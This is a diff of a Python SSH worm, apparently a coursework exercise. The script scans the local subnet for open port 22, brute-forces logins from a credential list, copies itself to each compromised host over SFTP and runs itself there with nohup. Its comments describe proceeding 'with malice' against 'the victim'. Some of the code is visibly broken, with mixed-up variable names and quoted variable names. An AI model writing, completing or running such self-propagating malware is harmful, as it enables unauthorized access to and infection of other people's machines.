@@ -2,11 +2,12 @@ import paramiko
 import sys
 import socket
 import nmap
-import netinfo
+#import netinfo
 import os
 import sys
 import os.path
 import socket, fcntl, struct
+#from getip import getifip
 
 # The list of credentials to attempt
 credList = [
@@ -88,7 +89,7 @@ def spreadAndExecute(sshClient):
 # return - 0 = success, 1 = probably wrong credentials, and
 # 3 = probably the server is down or is not running SSH
 ###########################################################
-def tryCredentials(host, userName, password, sshClient):
+def tryCredentials(host, username, password, sshClient):
 	
 	# Tries to connect to host using
 	# the username stored in variable userName
@@ -116,29 +117,15 @@ def tryCredentials(host, userName, password, sshClient):
 	# set the parameters to make things easier
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	
-	
 	try:
-		# connect to the remote system using ssh		
-		for credList in range(4):
-			ssh.connect("192.168.1.24" , username="credList", password="credList")
+		# connect to the remote system using ssh	
+		ssh.connect(host , username=username, password=password)
 	except:
-		print ("something went wrong while trying to establish a connection")
+		print ("Something went wrong while trying to establish a connection")
 		paramiko.SSHException()
-	
-	# create an instance of the SFTP client used for uploading/dl files and exe. commands
-	sftpClient = ssh.open_sftp()
-	
-	# Copy yourself toe the remote system. 
-	sftpClient.put("infected.txt", INFECTED_MARKER_FILE)
-	
-	# Make yourself executable on the remote system
-	ssh.exec_command("chmod a+x INFECTED_MARKER_FILE")
-		
+		return 1
 
-	# /tmp/infected.txt - the malicious file
-	
-	# run the whole commnand in the background	
-	ssh.exec_command("nohup python INFECTED_MARKER_FILE &")
+	return 0
 	
 
 ###############################################################
@@ -176,14 +163,16 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		tryCredentials(getHostsOnTheSameNetwork, username, password)
-		if tryCredentials == 0: 
-			print ("we have successfully compromised the victim")
+		if tryCredentials(host, username, password, ssh) == 0: 
+			print ("We have successfully compromised the victim")
+			attemptResults = ssh
+			return attemptResults
+			
 			
 	# Could not find working credentials
 	paramiko.SSHException()
 	
-	print("could not find working credentials")
+	print("Could not find working credentials")
 	#return None	
 
 ####################################################
@@ -205,7 +194,7 @@ def getMyIP(ifn):
 	return socket.inet_ntoa(fcntl.ioctl(sck.fileno(),0x8915,struct.pack(b'256s', ifn[:15]))[20:24])
 
 
-print("The ip of the current system is: " + getifip(b"eth0"))
+#print("The ip of the current system is: " + getMyIP(b"eth2"))
 #######################################################
 # Returns the list of systems on the same network
 # @return - a list of IP addresses on the same network
@@ -226,11 +215,17 @@ def getHostsOnTheSameNetwork():
 	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
 		
 	# Scan the network for host
-	hostInfo = portScanner.all_hosts()	
-	
-	return hostInfo
+	hostInfo = portScanner.all_hosts()
 
-print(getHostsOnTheSameNetwork())
+	runningHosts = []
+	for host in hostInfo:
+		if portScanner[host].state() == "up":
+			runningHosts.append(host)
+	
+	
+	return runningHosts
+
+#print(getHostsOnTheSameNetwork())
 
 
 # If we are being run without a command line parameters, 
@@ -247,9 +242,11 @@ if len(sys.argv) < 2:
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
-	pass
+	if isInfectedSystem():
+		exit()
 # TODO: Get the IP of the current system
-
+myIPa = getMyIP(b"eth2")
+print("The ip of the current system is: " + myIPa)
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
@@ -257,12 +254,14 @@ networkHosts = getHostsOnTheSameNetwork()
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
-
+networkHosts.remove(myIPa)
 print ("Found hosts: ", networkHosts)
 
 
 # Go through the network hosts
 for host in networkHosts:
+	
+	print("Connecting to " + host)	
 	
 	# Try to attack this host
 	sshInfo =  attackSystem(host)
@@ -293,7 +292,21 @@ for host in networkHosts:
 		# 	 # will throw IOError exception
 		# 	 # (that is, we know the system is
 		# 	 # not yet infected).
-		# 
+			# create an instance of the SFTP client used for uploading/dl files and exe. commands
+			sftpClient = ssh.open_sftp()
+	
+			# Copy yourself toe the remote system. 
+			sftpClient.put("infected.txt", INFECTED_MARKER_FILE)
+	
+			# Make yourself executable on the remote system
+			ssh.exec_command("chmod a+x INFECTED_MARKER_FILE")
+		
+
+			# /tmp/infected.txt - the malicious file
+	
+			# run the whole commnand in the background	
+			ssh.exec_command("nohup python INFECTED_MARKER_FILE &")
+ 
 			sftp.get(filepath, localpath)
 		except IOError:
 		       print ("This system should be infected")
@@ -306,4 +319,3 @@ for host in networkHosts:
 		
 		print ("Spreading complete")
 	
-
